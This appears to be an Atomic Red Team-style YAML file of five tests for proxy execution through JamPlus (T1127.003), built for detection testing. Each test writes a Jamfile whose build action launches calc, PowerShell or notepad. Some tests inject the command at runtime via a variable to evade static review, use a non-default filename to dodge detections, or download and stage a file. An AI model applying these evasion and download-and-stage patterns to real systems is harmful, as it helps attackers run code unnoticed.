@@ -1,0 +1,296 @@
+attack_technique: T1127.003
+display_name: 'Trusted Developer Utilities Proxy Execution: JamPlus'
+atomic_tests:
+
+- name: JamPlus proxy execution - launch calc.exe via Jamfile.jam action
+  description: |
+    Writes a minimal Jamfile.jam whose build action shell-executes calc.exe, then invokes jam.exe against it. Mirrors the reported abuse pattern of using JamPlus's build actions to proxy execution of an arbitrary binary from a reputable developer tool.
+    Expected output: calc.exe launches as a child process of jam.exe.
+  supported_platforms:
+  - windows
+  input_arguments:
+    jam_path:
+      description: Path to the JamPlus executable (jam.exe)
+      type: path
+      default: C:\JamPlus\jam.exe
+    work_dir:
+      description: Scratch directory to build the Jamfile.jam in
+      type: path
+      default: $env:TEMP\T1127.003_test1
+  dependency_executor_name: powershell
+  dependencies:
+  - description: JamPlus (jam.exe) and its required Jambase.jam must both exist at the specified path
+    prereq_command: |
+      $jamDir = Split-Path "#{jam_path}"
+      if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+      $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+      if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+      $zipPath = "$env:TEMP\jamplus.zip"
+      Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+      $extractDir = Split-Path "#{jam_path}"
+      New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+      Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+      Remove-Item $zipPath -Force
+      if (-not (Test-Path "#{jam_path}")) {
+        $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+        if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+      }
+      $jamDir = Split-Path "#{jam_path}"
+      if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+        $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+        if ($jambase) {
+          Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+        } else {
+          Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+        }
+      }
+  executor:
+    name: powershell
+    command: |
+      New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+      @'
+      actions RunPayload
+      {
+          calc.exe
+      }
+      RunPayload payload ;
+      NotFile payload ;
+      Always payload ;
+      Depends all : payload ;
+      '@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+      Push-Location "#{work_dir}"
+      & "#{jam_path}"
+      Pop-Location
+    cleanup_command: |
+      Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+- name: JamPlus proxy execution - launch PowerShell via Jamfile.jam action
+  description: |
+    Writes a Jamfile.jam whose build action invokes powershell.exe to write a marker file, simulating an adversary using JamPlus to proxy execution of a PowerShell payload rather than a GUI binary.
+    Expected output: a marker file is created by the powershell.exe process spawned from jam.exe.
+  supported_platforms:
+  - windows
+  input_arguments:
+    jam_path:
+      description: Path to the JamPlus executable (jam.exe)
+      type: path
+      default: C:\JamPlus\jam.exe
+    work_dir:
+      description: Scratch directory to build the Jamfile.jam in
+      type: path
+      default: $env:TEMP\T1127.003_test2
+    marker_file:
+      description: File the proxied PowerShell process will create
+      type: path
+      default: $env:TEMP\T1127.003_marker.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: JamPlus (jam.exe) and its required Jambase.jam must both exist at the specified path
+    prereq_command: |
+      $jamDir = Split-Path "#{jam_path}"
+      if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+      $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+      if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+      $zipPath = "$env:TEMP\jamplus.zip"
+      Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+      $extractDir = Split-Path "#{jam_path}"
+      New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+      Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+      Remove-Item $zipPath -Force
+      if (-not (Test-Path "#{jam_path}")) {
+        $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+        if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+      }
+      $jamDir = Split-Path "#{jam_path}"
+      if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+        $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+        if ($jambase) {
+          Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+        } else {
+          Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+        }
+      }
+  executor:
+    name: powershell
+    command: |
+      New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+      @"
+      actions RunPayload
+      {
+          powershell.exe -NoProfile -Command "Set-Content -Path '#{marker_file}' -Value 'T1127.003 test'"
+      }
+      RunPayload payload ;
+      NotFile payload ;
+      Always payload ;
+      Depends all : payload ;
+      "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+      Push-Location "#{work_dir}"
+      & "#{jam_path}"
+      Pop-Location
+    cleanup_command: |
+      Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+      Remove-Item "#{marker_file}" -Force -ErrorAction Ignore
+
+- name: JamPlus proxy execution - payload injected via command-line variable substitution
+  description: |
+    Writes an innocuous-looking Jamfile.jam whose action body only references a variable, with no payload embedded in the file itself. The actual command is supplied entirely via a jam -s command-line variable at invocation time, so the Jamfile would pass a static content review while the executed command is assembled only at runtime. Simulates a supply-chain-style abuse pattern where a pre-approved, benign-looking build script is weaponized purely through its invocation parameters.
+    Expected output: calc.exe launches as a child process of jam.exe, despite the Jamfile containing no reference to calc.exe.
+  supported_platforms:
+  - windows
+  input_arguments:
+    jam_path:
+      description: Path to the JamPlus executable (jam.exe)
+      type: path
+      default: C:\JamPlus\jam.exe
+    work_dir:
+      description: Scratch directory to build the Jamfile.jam in
+      type: path
+      default: $env:TEMP\T1127.003_test3b
+    payload_command:
+      description: Command injected at invocation time via the PAYLOAD variable
+      type: string
+      default: calc.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: JamPlus (jam.exe) and its required Jambase.jam must both exist at the specified path
+    prereq_command: |
+      $jamDir = Split-Path "#{jam_path}"
+      if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      Write-Host "Run test 1's get_prereq_command first to install JamPlus and Jambase.jam."
+  executor:
+    name: powershell
+    command: |
+      New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+      @'
+      actions RunPayload
+      {
+          $(PAYLOAD)
+      }
+      RunPayload payload ;
+      NotFile payload ;
+      Always payload ;
+      Depends all : payload ;
+      '@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+      Push-Location "#{work_dir}"
+      & "#{jam_path}" -s"PAYLOAD=#{payload_command}" payload
+      Pop-Location
+    cleanup_command: |
+      Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+- name: JamPlus proxy execution - command execution via explicitly named Jamfile
+  description: |
+    Writes a build-instructions file under a non-default filename and invokes JamPlus against it explicitly using the -f flag, rather than relying on JamPlus's default Jamfile.jam auto-discovery. Demonstrates a distinct invocation path that may evade detections keyed only on the default filename.
+    Expected output: notepad.exe launches as a child process of jam.exe.
+  supported_platforms:
+  - windows
+  input_arguments:
+    jam_path:
+      description: Path to the JamPlus executable (jam.exe)
+      type: path
+      default: C:\JamPlus\jam.exe
+    work_dir:
+      description: Scratch directory to build the custom jam file in
+      type: path
+      default: $env:TEMP\T1127.003_test4b
+  dependency_executor_name: powershell
+  dependencies:
+  - description: JamPlus (jam.exe) and its required Jambase.jam must both exist at the specified path
+    prereq_command: |
+      $jamDir = Split-Path "#{jam_path}"
+      if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      Write-Host "Run test 1's get_prereq_command first to install JamPlus and Jambase.jam."
+  executor:
+    name: powershell
+    command: |
+      New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+      @'
+      actions RunPayload
+      {
+          cmd.exe /c start "" notepad.exe
+      }
+      RunPayload payload ;
+      NotFile payload ;
+      Always payload ;
+      Depends all : payload ;
+      '@ | Set-Content -Path "#{work_dir}\build_instructions.jam"
+      Push-Location "#{work_dir}"
+      & "#{jam_path}" -f build_instructions.jam payload
+      Pop-Location
+    cleanup_command: |
+      Get-Process notepad -ErrorAction Ignore | Stop-Process -Force -ErrorAction Ignore
+      Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+- name: JamPlus proxy execution - payload download and execute via jam build action
+  description: |
+    Writes a Jamfile.jam whose build action downloads a benign file from a local/looped-back source and writes it to disk via jam, simulating the download-and-stage step adversaries perform before executing a second-stage payload through JamPlus, without actually executing attacker-controlled content.
+    Expected output: a file is retrieved and written to disk by a process spawned from jam.exe.
+  supported_platforms:
+  - windows
+  input_arguments:
+    jam_path:
+      description: Path to the JamPlus executable (jam.exe)
+      type: path
+      default: C:\JamPlus\jam.exe
+    work_dir:
+      description: Scratch directory to build the Jamfile.jam in
+      type: path
+      default: $env:TEMP\T1127.003_test5
+    staged_file:
+      description: Path the proxied process will write to
+      type: path
+      default: $env:TEMP\T1127.003_staged.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: JamPlus (jam.exe) and its required Jambase.jam must both exist at the specified path
+    prereq_command: |
+      $jamDir = Split-Path "#{jam_path}"
+      if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+      $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+      if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+      $zipPath = "$env:TEMP\jamplus.zip"
+      Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+      $extractDir = Split-Path "#{jam_path}"
+      New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+      Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+      Remove-Item $zipPath -Force
+      if (-not (Test-Path "#{jam_path}")) {
+        $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+        if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+      }
+      $jamDir = Split-Path "#{jam_path}"
+      if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+        $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+        if ($jambase) {
+          Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+        } else {
+          Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+        }
+      }
+  executor:
+    name: powershell
+    command: |
+      New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+      @"
+      actions Stage
+      {
+          powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md' -OutFile '#{staged_file}' -UseBasicParsing"
+      }
+      Stage payload ;
+      NotFile payload ;
+      Always payload ;
+      Depends all : payload ;
+      "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+      Push-Location "#{work_dir}"
+      & "#{jam_path}"
+      Pop-Location
+    cleanup_command: |
+      Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+      Remove-Item "#{staged_file}" -Force -ErrorAction Ignore
